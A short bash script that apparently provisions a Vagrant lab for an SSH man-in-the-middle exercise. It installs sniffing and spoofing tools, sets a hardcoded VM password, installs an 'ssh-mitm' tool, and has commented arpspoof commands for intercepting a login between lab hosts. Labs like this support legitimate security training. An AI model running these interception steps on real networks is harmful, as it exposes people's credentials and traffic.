#!/bin/bash

# FUCK wireshark-common via tshark FOR IGNORING DFE!

sudo apt-get update
sudo DEBIAN_FRONTEND=noninteractive apt-get install -y dos2unix \
    libssl-dev \
    python3-netaddr \
    python3-netifaces \
    nmap \
    ettercap-text-only \
    tshark \
    dsniff 
echo 'ubuntu:vagrant1' | sudo chpasswd
cp -ar /vagrant/ssh-mitm ~/
cd ~/ssh-mitm && sudo ./install.sh

# already root

# sudo ./JoesAwesomeSSHMITMVictimFinder.py --interface enp0s8
# sudo ./run.sh
# new window: arpspoof -r -t 172.28.x.1 172.28.x.5 
#arpspoof -i enp0s8 -r -t 172.28.128.20 172.28.128.30

# from alice log into bob -- good day sir
